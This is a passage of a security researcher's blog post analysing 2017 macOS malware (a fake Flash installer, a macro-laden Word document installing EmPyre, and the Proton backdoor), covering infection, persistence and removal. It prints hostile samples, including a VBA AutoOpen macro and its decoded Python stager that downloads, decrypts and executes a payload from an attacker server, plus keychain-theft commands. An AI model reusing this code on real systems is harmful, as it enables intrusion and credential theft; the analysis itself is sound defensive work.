    "Applications\/Calendar.app\/",<br>
    "Applications\/Chess.app\/",<br>
    ...<br>
    ]<br>
    <br>
    "process name is: Dock\t PID: 254  Run from: file:\/\/\/System\/Library\/CoreServices\/Dock.app\/Contents\/MacOS\/Dock",<br>
    "process name is: Spotlight\t PID: 300  Run from: file:\/\/\/System\/Library\/CoreServices\/Spotlight.app\/Contents\/MacOS\/Spotlight",<br>
    "process name is: Safari\t PID: 972  Run from: file:\/\/\/Applications\/Safari.app\/Contents\/MacOS\/Safari",<br>
    ...<br>
    <br>
	</span>
	</div>
	<br>
	In order to grab the keychains of the infected system, the malware zips everything from the <span class="n3rdFont">/Library/Keychains/</span> directory into the <span class="n3rdFont">/etc/kcbackup.cfg</span> file:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ zip -rj /etc/kcbackup.cfg /Library/Keychains/<br>
 		adding: apsd.keychain (deflated 58%)<br>
  		adding: System.keychain (deflated 70%)<br>
	</span>
	</div>
	<br>
	The malware exfiltrates the collected data to a command &amp; control server, by invoking the <span class="n3rdFont">'SendCollectedDataTo:withThisTargetId:'</span> method, which in turn invokes the <span class="n3rdFont">uploadFile: ToServer: withTargetId:</span> method:
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
	<span class="n3rdFont">
	-[AuthenticationController SendCollectedDataTo:withThisTargetId:](void * self, void * _cmd, void * arg2, void * arg3) {<br>
	&nbsp;&nbsp;&nbsp;...<br>
	<br>
	&nbsp;&nbsp;&nbsp;if (([CUtils hasInternet:0x0] &amp; 0x1 &amp; 0xff) != 0x0) {<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_120 = [@"/tmp/applist.txt" retain];<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[CUtils uploadFile:var_120 ToServer:0x0 withTargetId:0x0];<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br>
	}
    <br>
	</span>
	</div>
	<br>
    <div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
  		<span style="vertical-align:middle">disinfection:</span>
	</div>
	"Features such as persistence do not appear to work" ... note the security researchers who analyzed the sample. Thus in theory simply killing the malicious app (<span class="n3rdFont">addone flashplayer.app</span>), or rebooting an infected system should 'remove' the malware. 
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ ps aux | grep  flash<br>
 	user 666  /Users/user/Desktop/<b>addone flashplayer.app</b><br>
 	<br>
 	$ kill -9 666
	</span>
	</div>
	<br>
	However, if the malware was able to run it likely already collected and exfiltrated one's credentials and keychains - so, kind of game over :(
	<br><br>
	On the off chance the malware was able to persist, the final line of the <span class="n3rdFont">rc.common</span> file will contain a command that executes a malicious script: <span class="n3rdFont">/etc/.checkdev</span>. Delete this command and the <span class="n3rdFont">.checkdev</span>file, to remove the persistent infection! 
  	<br>
  	<br>

  	<br>
 	<span style="color: #95c02d; font-weight: bold;"><a id="Empyre"></a>Macro'd Word Document (w/ Empyre):</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/empyre.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  Macro'd Word Document (w/ Empyre)
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Feburary, by Snorre Fagerland‚Äè (@fstenv)</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Malicous Word document</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">via Empyre; full remote command and control of an infected host</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove: launch item/cronjob/login hoook/etc. </td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;">
	  	<a class="inlineLink" href="https://objective-see.com/blog/blog_0x17.html">"New Attack, Old Tricks"</a> (P. Wardle/Objective-See)
	  </td>
	</tr>
	</tbody>
	</table>
	<br>
  	Though unnamed by the anti-virus community, this malicious Word documented Mac users in an attempt to surreptitiously install Empyre (an open-source macOS post exploitation agent). 
  	<br>
  	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection:</span>
	</div>
	On February 6th, Snorre Fagerland (<a class="inlineLink" href="https://twitter.com/fstenv">@fstenv</a>) <a class="inlineLink" href="https://twitter.com/fstenv/status/828552352588247040">tweeted</a> the following: 
	<br><br>
		<span><img src="../images/blog/blog_0x25/empyreTweet.png" width="700" style="display:block; margin:auto;"/></span>
	<br>
	...so we have a malicious word document circulating in the wild, targeting macOS users. Neat!
	<br>
	<br>
	I grabbed the sample ("U.S. Allies and Rivals Digest Trump's Victory - Carnegie Endowment for International Peace.docm") from VirusTotal (see <a class="inlineLink" href="https://www.virustotal.com/#/file/07adb8253ccc6fee20940de04c1bf4a54a4455525b2ac33f9c95713a8a102f3d/detection">here</a>), noting that at the time only four AV engines flagged the Word document as malicious: 
	<br><br>
		<span><img src="../images/blog/blog_0x25/empyreVTScan.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	Opening the document in Microsoft Word (version 2011, within an isolated macOS VM) triggered an "this document contains macros" warning: 
	<br><br>
		<span><img src="../images/blog/blog_0x25/empyreMacros.png" width="658" style="display:block; margin:auto;"/></span>
	<br>
	If a macOS user opened this document in Microsoft Word, and disregarded this warning...they'd become infected! 
	<br>
	<br>
	As noted <a class="inlineLink" href="https://www.decalage.info/vba_tools#MS_Office_2007_documents">online</a>, recent Word documents are actually "XML files stored in Zip archives"...and that "VBA macros are usually stored in a binary OLE file within the Zip archive, called <span class="n3rdFont">vbaProject.bin</span>. 
	<br><br>
	To extract and analyze the malicious embedded macros, one can use clamAV's <span class="n3rdFont">sigtool</span>:

	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ unzip "U.S. Allies and Rivals Digest Trump's Victory - Carnegie Endowment for International Peace.docm"<br>
	 <br>
	  &nbsp;&nbsp;inflating: [Content_Types].xml<br>
	  &nbsp;&nbsp;inflating: _rels/.rels<br>             
	  &nbsp;&nbsp;inflating: word/_rels/document.xml.rels<br>  
	  &nbsp;&nbsp;inflating: word/document.xml<br>       
	  &nbsp;&nbsp;inflating: word/theme/theme1.xml<br>   
	  &nbsp;&nbsp;inflating: <b>word/vbaProject.bin</b><br>     
	  &nbsp;&nbsp;...
	<br>
	<br>
	$ <b>sigtool --vba word/vbaProject.bin</b>
	 <br>
	 <br>
	  -------------- start of code ------------------<br>
		Attribute VB_Name = &quot;ThisDocument&quot;<br>
		Attribute VB_Base = &quot;1Normal.ThisDocument&quot;<br>
		Attribute VB_GlobalNameSpace = False<br>
		...<br>
		<br>
		Sub autoopen()<br>
		Fisher<br>
		End Sub<br>
		....<br>
		<br>
		Public Declare Function system Lib &quot;libc.dylib&quot; (ByVal command As String) As Long<br>
		Public Sub Fisher()<br>
		<br>
		Dim result As Long<br>
		    Dim cmd As String<br>
		cmd = &quot;ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3&quot;<br>
		cmd = cmd + &quot;NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm&quot;<br>
		cmd = cmd + &quot;llZF9jb250ZXh0Jyk6c3NsLl9jcmVhdGVfZGVmYXVsdF9odH&quot;<br>
		cmd = cmd + &quot;Rwc19jb250ZXh0ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF&quot;<br>
		cmd = cmd + &quot;9jb250ZXh0OwppbXBvcnQgc3lzLCB1cmxsaWIyO2ltcG9ydC&quot;<br>
		....<br>
		cmd = cmd + &quot;BlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl&quot;<br>
		cmd = cmd + &quot;0pKQpleGVjKCcnLmpvaW4ob3V0KSk=&quot;<br>
		<br>
		result = system(&quot;echo &quot;&quot;import sys,base64;exec(base64.b64decode(\&quot;&quot; &quot; &amp; cmd &amp; &quot; \&quot;&quot;));&quot;&quot; | python &amp;&quot;)<br>
		End Sub<br> 
	<br>
	</span>
	</div>
	<br>
	According to <a class="inlineLink" href="https://support.microsoft.com/en-us/help/286310/description-of-behaviors-of-autoexec-and-autoopen-macros-in-word">Microsoft</a>, as its name suggests, the "AutoOpen macro runs after you open a new document." So whenever a user opens this document on Mac, in Word, (assuming macros have been/are enabled), the <span class="n3rdFont">Fisher</span> function will automatically be executed.
	<br>
	<br>
	The <span class="n3rdFont">Fisher</span> function decodes a base64 chunk of data (stored in the <span class="n3rdFont">cmd</span> variable) then executes it via python. Using python's <span class="n3rdFont">base64</span> module we can easily decode the data:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ python<br>
	<br>
	&gt;&gt;&gt; import base64<br>
	&gt;&gt;&gt; cmd = &quot;ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBv .... &quot;<br>
	&gt;&gt;&gt; base64.b64decode(cmd)<br>
	<br>
	...<br>
	<br>
	dXFprvsgMBSIyPf = 'atfMzZOqVLbcj'<br>
	import ssl;<br>
	if hasattr(ssl, '_create_unverified_context'): <br>
	&nbsp;&nbsp;&nbsp;ssl._create_default_https_context = ssl._create_unverified_context;<br>
	import sys, urllib2;<br>
	import re, subprocess;<br>
	<br>
	cmd = &quot;ps -ef | grep Little\ Snitch | grep -v grep&quot;<br>
	ps = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)<br>
	out = ps.stdout.read()<br>
	ps.stdout.close()<br>
	if re.search(&quot;Little Snitch&quot;, out):<br>
	&nbsp;&nbsp;&nbsp;sys.exit()<br>
	<br>
	o = __import__({<br>
	&nbsp;&nbsp;&nbsp;2: 'urllib2',<br>
	&nbsp;&nbsp;&nbsp;3: 'urllib.request'<br>
	}[sys.version_info[0]], fromlist = ['build_opener']).build_opener();<br>
	<br>
	UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0';<br>
	o.addheaders = [('User-Agent', UA)];<br>
	<br>
	a = o.open('https://www.securitychecking.org:443/index.asp').read();<br>
	key = 'fff96aed07cb7ea65e7f031bd714607d';<br>
	<br>
	S, j, out = range(256), 0, []<br>
	for i in range(256):<br>
	&nbsp;&nbsp;&nbsp;j = (j + S[i] + ord(key[i % len(key)])) % 256<br>
	&nbsp;&nbsp;&nbsp;S[i], S[j] = S[j], S[i]<br>
	<br>
	i = j = 0<br>
	for char in a:<br>
	&nbsp;&nbsp;&nbsp;i = (i + 1) % 256<br>
	&nbsp;&nbsp;&nbsp;j = (j + S[i]) % 256<br>
	&nbsp;&nbsp;&nbsp;S[i], S[j] = S[j], S[i]<br>
	&nbsp;&nbsp;&nbsp;out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))<br>
	<br>
	exec(''.join(out))<br>
	<br>
	</span>
	</div>
	<br>
	The decoded python contained in the auto-run macro, is pretty simple to read. In short it:
	<ol>
	<li>checks to make sure LittleSnitch is not running</li>
	<li>downloads a second-stage payload from <span class="n3rdFont">https://www.securitychecking.org:443/index.asp</span></li>
	<li>RC4 decrypts this payload (key: <span class="n3rdFont">fff96aed07cb7ea65e7f031bd714607d</span>)</li>
	<li>executes this now decrypted payload</li>
	</ol>
	Does python code look familiar? Yes! It's taken, almost verbatim from the open-source <a class="inlineLink" href="https://github.com/EmpireProject/EmPyre">EmPyre</a> project. Specifically the <span class="n3rdFont">lib/common/stagers.py</span> file:
	<br><br>
		<span><img src="../images/blog/blog_0x25/empyreGithub.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	EmPyre is a "pure Python post-exploitation agent built on cryptologically-secure communications and a flexible architecture." Ok, so the attackers are using an open-source multi-stage post-exploitation agent.
	<br>
	<br>
	As mentioned above, the goal of the first stage python code is to download and execute a second stage component from <span class="n3rdFont">https://www.securitychecking.org:443/index.asp</span>. Unfortunately this file is now inaccessible. However, this file was likely just the second-stage component of Empyre (though yes, the attackers could of course download and executed something else). 
	<br>
	<br>
	This 2<sup>nd</sup>-stage component of Empyre is the persistent agent, that once installed will complete the infection and affords a remote attacker continuing access to an infected host.
  	<br>
  	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
	The malware will only be persisted once the 2<sup>nd</sup>-stage component has been downloaded and executed from <span class="n3rdFont">https://www.securitychecking.org:443/index.asp</span>. Assuming this persistent component is indeed Empyre "stage-two", how does it persist? Well that's configurable:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	(EmPyre) > usemodule persistence<br><br>
	mutli/crontab&nbsp;&nbsp;&nbsp;osx/CreateHijacker&nbsp;&nbsp;&nbsp;osx/launchdaemonexecutable&nbsp;&nbsp;&nbsp;osx/loginhook
	<br>
	</span>
	</div>
	<br>
	So persistence is likely achieved via a:
	<ul>
	<li>cronjob</li>
	<li>dylib hijack</span></li>
	<li>launch daemon</li>
	<li>login hook</li>
	</ul>
	If the second-stage component of the malware is persisted as a cronjob orem a launch daemon, BlockBlock will detect the persistence attempt:
	<br><br>
		<span><img src="../images/blog/blog_0x25/empyrePersist.png" width="800" style="display:block; margin:auto;"/></span>
	...I'll likely update BlockBlock to monitor for persistence thru <span class="n3rdFont">login</span> <span class="n3rdFont">items</span>, even though this is a very archaic and deprecated persistence technique. Regardless tools such as <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a> or <a class="inlineLink" href="https://objective-see.com/products/dhs.html">Dylib Hijack Scanner</a> will be able to reveal the persistent component, regardless of how it is installed :)
	<br>
	<br>
	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
  		<span style="vertical-align:middle">features:</span>
	</div>
	The persistent component of EmPyre can also be configured to run a wide range of EmPyre modules (see: <a class="inlineLink" href="https://github.com/EmpireProject/EmPyre/tree/master/lib/modules/collection/osx">lib/modules/collection/osx</a>). These modules allow the attacker to perform 'standard' backdoor-type actives such as executing arbitrary commands, file exfiltration, and more. However, it also supports a myriad of more nefarious actions such as:
	<ul style="list-style-type:square">
			<li>enabling the webcam</li>
			<li>dumping the keychain</li>
			<li>installing a keylogger</li>
			<li>accessing a user's browser history</li>
			<li>...and much more</li>
	</ul>
		<span><img src="../images/blog/blog_0x25/empyreModules.png" width="800" style="display:block; margin:auto;"/></span>
	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
  		<span style="vertical-align:middle">disinfection:</span>
	</div>
	As the 2<sup>nd</sup>-stage (persistent) component of this attack was never recovered, we cannot be 100% sure how to clean an infected system. However, as noted, it is more than likely that the attackers utilized Empyre's 'stage-two', for persistence, which can only persisted in a finite number of ways.
	<br>
	<br>
	Thus checking these locations (cronjobs, launch items, etc) for a malicious python script should reveal any persistent infection associated with this attack. Such checks can be done manually. For example, <span class="n3rdFont">crontab -l</span> will show installed cronjobs:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ crontab -l<br>
	@daily ~/Library/Application Support/.malware.py<br>
	</span>
	</div>
	<br>
	However, it may be easier to use a tool such as <a class="inlineLink" href="https://objective-see.com/products/knockknock.html">KnockKnock</a> which programmatically enumerates items found in such persistent locations:
	<br>
	<br>
		<span><img src="../images/blog/blog_0x25/empyreDisinfect.png" width="800" style="display:block; margin:auto;"/></span>
	<div>
	<br>
    <br>

	<br>
 	<span style="color: #95c02d; font-weight: bold;"><a id="Proton"></a>Proton:</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x25/proton.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  Proton
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Feburary, Sixgill (initial report)</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Trojaned 3<sup>rd</sup>-party macOS applications/fake websites</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">backdoor, with focus on collection and exfiltration of keychains, &amp; passwords.</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove: launch agent</td>
	</tr>

	<tr style="border:none;">
	  <td style="border:none; vertical-align:top;"><b>writeups:</b></td>
	  <td style="border:none;">

	  	<ul style="list-style-type:square">
			<li><a class="inlineLink" href="https://www.cybersixgill.com/wp-content/uploads/2017/02/02072017%20-%20Proton%20-%20A%20New%20MAC%20OS%20RAT%20-%20Sixgill%20Threat%20Report.pdf">"Proton - A New Mac OS Rat"</a> (SixGill)</li>
			<li><a class="inlineLink" href="https://objective-see.com/blog/blog_0x1F.html">"OSX/Proton.B, a brief analysis, at 6 miles up"</a> (P. Wardle/Objective-See)</li>
			<li><a class="inlineLink" href="https://www.welivesecurity.com/2017/10/20/osx-proton-supply-chain-attack-elmedia/">"OSX/Proton[C] spreading again through supply-chain attack"</a> (Eset)</li>
			<li><a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/mac-threat-analysis/2017/11/osx-proton-spreading-through-fake-symantec-blog/">"OSX.Proton[D] spreading through fake Symantec blog"</a> (MalwareBytes)</li>
		</ul>

	  </td>
	</tr>
	</tbody>
	</table>
	<br>
  	Initially discovered in February, OSX/Proton keeps popping up throughout 2017. A 'feature complete' macOS backdoor, it has a propensity for stealing sensitive information from infected systems. However this malware's most unique feature was it's effective and perhaps novel (for macOS) infection vector.
  	<br>
  	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
  		<span style="vertical-align:middle">infection:</span>
	</div>
	The first public mention of Proton comes from a Sixgill blog post titled, <a class="inlineLink" href="https://www.cybersixgill.com/proton-a-new-mac-os-rat/">"Proton - A New Mac OS Rat"</a>. In this post, the researchers detail the 'discovery' of Proton: 
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		"<i>[we] encountered a post in one of the leading, closed Russian cybercrime message boards. The author of the thread announced a RAT dubbed Proton, intended for installation exclusively on MAC OS devices. The author offered this product in one of the leading underground cybercrime markets.</i>"
		</span>
	</div>
	<br>
	Though malware offered for sale ('malware as a service') is fairly common for in the Windows world, it's less common for macOS malware. And in terms of infection, this generally means a 2<sup>nd</sup> party (i.e. the purchaser) is responsible for the vector. In 2017, we saw 4 variants of Proton: A-D. While I am unaware of variant A's infection mechanism, the other variant's methods of infections are described below.
	<br>
	<br>
	Proton variant 'B' and 'C' both utilized an interesting attack vector in order to infect macOS users. First the attackers gained unauthorized access to a legitimate 3<sup>rd</sup>-party application developer's website. Then with such access, they trojaned the legitimate application - infecting it with Proton. From that point on, users who downloaded the (now infected) application from the legitimate developer's website would become infected once the application was executed. This rather insidious attack (often referred to as a "supply-chain attack"), can successfully infect even security-conscious macOS users!
	<br>
	<br>
	In order to propagate Proton variant 'B', a mirror server of the popular open-source video transcoder, <a class="inlineLink" href="https://handbrake.fr">HandBrake</a>, was hacked. Once the Handbrake developer's detected (or where alerted about) the infection, the following 'security alert' was added to the site:
	<br>
		<span><img src="../images/blog/blog_0x25/protonHandbrake.png" width="404" style="display:block; margin:auto;"/></span>
	<div>
	<div style="border: 1px solid red; padding: 10px; margin-top:15px; font-size: 13px;">
		<span class="n3rdFont">
		<br>
		<b>SECURITY WARNING</b>
		<br>
		Anyone who has downloaded HandBrake on Mac between [02/May/2017 14:30 UTC] and [06/May/2017 11:00 UTC] needs to verify the SHA1 / 256 sum of the file before running it.<br>
		<br>
		<br>Anyone who has installed HandBrake for Mac needs to verify their system is not infected with a Trojan. You have 50/50 chance if you've downloaded HandBrake during this period.<br>
		<br>
		</span>
	</div>
	<br>
	Variant 'C' of Proton propagated in a similar way. Specifically the attacker gained unauthorized access to <a class="inlineLink" href="https://www.eltima.com/">'Eltima'</a> and trojanizing several applications. It should be noted that for this variant, the attacker's signed the trojanized applications with a 'valid' Apple developer ID, meaning macOS malware mitigations such as Gatekeeper would be 'bypassed' (well, more specifically, avoided). Luckily (now) the certificate is now revoked:
	<br><br>
		<span><img src="../images/blog/blog_0x25/protonSigned.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	The final variant of Proton seen in 2017, variant 'D' targeted Mac users in a less elegant way. As discovered by <a class="inlineLink" href="https://twitter.com/noarfromspace">@noarfromspace</a>, for this variant the attackers created a fake website that attempted to masquerade as a Symantec blog:
	<br>
		<span><img src="../images/blog/blog_0x25/protonSymantec.png" width="625" style="display:block; margin:auto;"/></span>
	<br>
	More details on this can be found in MalwareByte's blog post titled, <a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/mac-threat-analysis/2017/11/osx-proton-spreading-through-fake-symantec-blog/">"OSX.Proton spreading through fake Symantec blog"</a>:
	<div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
			"<i>The fake site contains a blog post about a supposed new version of CoinThief, a piece of malware from 2014. The fake post promotes a program called 'Symantec Malware Detector' supposedly to detect and remove the malware. Users who download and run the 'Symantec Malware Detector' will instead be infected with malware [OSX/Proton.D]</i>"		
		</span>
		</div>
	<br>
	<br>
		<span><img src="../images/blog/blog_0x25/protonSymantecInfector.png" width="535" style="display:block; margin:auto;"/></span>
	<br>
	<br>
  	<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
  		<span style="vertical-align:middle">persistence:</span>
	</div>
	Proton persists itself as a Launch Agent. Thought (AFAIK) all variants persist in a similar manner, let's take a closer look at variant B. 
	<br>
	<br>
	Firing up my open-source macOS process monitor (on github: <a class="inlineLink" href="https://github.com/objective-see/ProcInfo">ProcInfo</a>) and executing the infected Handbrake application, results in the following 'process' events:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		[new process]<br>
			pid=1368<br>
			binary=/Volumes/HandBrake/HandBrake.app/Contents/MacOS/HandBrake<br>
			signatureStatus = "-67062 (unsigned)<br>
		<br>
		[new process]<br>
			pid=1371<br>
			binary=/usr/bin/unzip<br>
			args: "-P", "qzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ", "/Volumes/HandBrake/HandBrake.app/Contents/Resources/HBPlayerHUDMainController.nib", "-d", "/tmp"<br>
		<br>
		[new process]<br>
			pid=1372<br>
			binary=/usr/bin/open<br>
			args: "/tmp/HandBrake.app"<br>
		<br>
		</span>
		</div>
		<br>
		From this <a class="inlineLink" href="https://github.com/objective-see/ProcInfo">ProcInfo</a> output, we can see that the infected Handbrake application:
		<ol>
		<li>unzips <span class="n3rdFont">Contents/Resources/HBPlayerHUDMainController.nib</span> to <span class="n3rdFont">/tmp/HandBrake.app‚Ä®</span>. This 'nib' is a password protected zip file who's password is: <span class="n3rdFont">qzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ</span></li><br>
		<li>launches (opens) <span class="n3rdFont">/tmp/HandBrake.app</span></li>
		</ol>
		Once the <span class="n3rdFont">/tmp/HandBrake.app</span> is launched, it displays a (fake) authentication popup - which is how the malware attempts to elevate its privileges: 
		<br><br>
		<span><img src="../images/blog/blog_0x25/protonAuth.png" width="469" style="display:block; margin:auto;"/></span>
		<br>		
		<br>
		If the user is tricked into providing a user name and password the malware will install itself (<span class="n3rdFont">/tmp/HandBrake.app</span>) persistently as: <span class="n3rdFont">'activity_agent.app'</span>.
		<br>
		<br>
		It does this by creating a Launch Agent plist file (<span class="n3rdFont">fr.handbrake.activity_agent.plist</span>). Dumping this file, we can see the malware has set the <span class="n3rdFont">RunAtLoad</span> key to true, which will ensure that it is automatically started each time the user logs in:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>
		&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;<br>
		&lt;plist version=&quot;1.0&quot;&gt;<br>
		&lt;dict&gt;<br>
        &nbsp;&nbsp;&lt;key&gt;KeepAlive&lt;/key&gt;<br>
        &nbsp;&nbsp;&lt;true/&gt;<br>
        &nbsp;&nbsp;...<br>
 	  	&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
        &nbsp;&nbsp;&lt;array&gt;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Users/user/Library/RenderFiles/activity_agent.app/<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contents/MacOS/activity_agent&lt;/string&gt;<br>
        &nbsp;&nbsp;&lt;/array&gt;<br>
        &nbsp;&nbsp;&lt;key&gt;<b>RunAtLoad</b>&lt;/key&gt;<br>
        &nbsp;&nbsp;<b>&lt;true/&gt;</b><br>
		&lt;/dict&gt;<br>
		&lt;/plist&gt;<br>
		</span>
		</div>
		<br>
		As noted, other variants persist in similar manner, although the name of the Launch Agent plist is different. For example, when executing variant 'C' <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> detects a persistence attempt, noting that the malware is attempting to persist via <span class="n3rdFont">/Library/LaunchAgents/com.Eltima.UpdaterAgent.plist</span>:
		<br><br>
		<span><img src="../images/blog/blog_0x25/protonPersist.png" width="755" style="display:block; margin:auto;"/></span>
		<br>	
		Variant 'D' persists via a plist file named <span class="n3rdFont">com.apple.xpcd.plist</span> also within the <span class="n3rdFont">/Library/LaunchAgents/</span> directory.
		<br>
		<br>
		<div>
  		<img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
  		<span style="vertical-align:middle">features:</span>
		</div>
		The original SixGill <a class="inlineLink" href="https://www.cybersixgill.com/proton-a-new-mac-os-rat/">blog post</a> contains a screencapture of the advertised features of Proton:
		<br><br>
		<span><img src="../images/blog/blog_0x25/protonFeatures.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		We can gain more insight into the malware's features by reversing its core binary. Specifically, we determine that the malware (here, variant 'B') will somewhat 'stealthily' build a path to an encrypted file named <span class="n3rdFont">'.hash'</span> in its resources directory (<span class="n3rdFont">/tmp/HandBrake.app/Contents/Resources/.hash</span>):
		<br>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		<span style="color: #006600;">//path: /tmp/HandBrake.app/Contents/Resources/<b>.hash</b></span><br>
		rbx = [NSString stringWithFormat:@"%@/%@%@%@%@%@", r13, @".", r9, @"a", @"s", @"h"];
		</span>
		</div>
		<br>
		This file is loaded into memory by the malware and then decrypted via a call to <span class="n3rdFont">[RNDecryptor decryptData:withPassword:error:]</span>. The decryption password is <span class="n3rdFont">'9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e'</span>:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		Process 486 stopped<br>
		* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over<br>
		HandBrake`___lldb_unnamed_symbol521$$HandBrake:<br>
		<br>
		->  0x100017583 &lt;+259&gt;: callq  *%r15<br>
		    0x100017586 &lt;+262&gt;: movq   %rax, %rdi<br>
		    0x100017589 &lt;+265&gt;: callq  0x100049dae<br>
		    0x10001758e &lt;+270&gt;: movq   %rax, %r13<br>
		    <br>
		(lldb) po $rdi<br>
		<b>RNDecryptor</b><br>
		<br>
		(lldb) x/s $rsi<br>
		0x10004db2b: <b>"decryptData:withPassword:error:"</b><br>
		<br>
		(lldb) po $rcx<br>
